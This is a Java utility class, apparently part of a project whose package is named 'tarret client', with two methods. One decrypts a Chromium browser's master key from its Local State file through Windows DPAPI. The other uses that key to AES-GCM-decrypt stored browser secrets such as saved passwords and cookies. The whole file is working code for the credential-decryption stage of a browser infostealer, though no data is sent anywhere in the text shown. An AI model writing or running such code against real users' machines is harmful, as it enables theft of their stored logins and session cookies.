package de.hallotheengineer.tarret.client.data;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileReader;
import java.util.Arrays;
import java.util.Base64;

public class DataUtils {
    public static byte[] getKey(File path) {
        try {

            JsonObject localStateJson = new Gson().fromJson(new FileReader(path), JsonObject.class);
            byte[] encryptedKeyBytes = localStateJson.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString().getBytes();
            encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBytes);
            encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, 5, encryptedKeyBytes.length);
            return Crypt32Util.cryptUnprotectData(encryptedKeyBytes);

        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
    public static String decrypt(byte[] encryptedData, byte[] key) {
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            byte[] iv = Arrays.copyOfRange(encryptedData, 3, 15);
            byte[] payload = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);
            GCMParameterSpec spec = new GCMParameterSpec(128, iv);
            SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
            cipher.init(2, keySpec, spec);
            return new String(cipher.doFinal(payload));
        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
